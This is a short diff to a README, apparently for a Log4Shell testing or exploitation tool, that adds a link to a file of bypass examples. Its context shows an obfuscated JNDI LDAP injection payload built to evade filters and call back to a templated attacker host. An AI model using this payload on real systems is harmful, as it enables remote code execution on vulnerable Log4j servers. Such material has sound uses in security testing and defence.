@@ -211,6 +211,7 @@ For example:
 ```
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{ .CADDR }}/{{ .Resource }}}
 ```
+You can find more examples [here](internal/resource/bypass.txt)
 
 ## References
 - https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
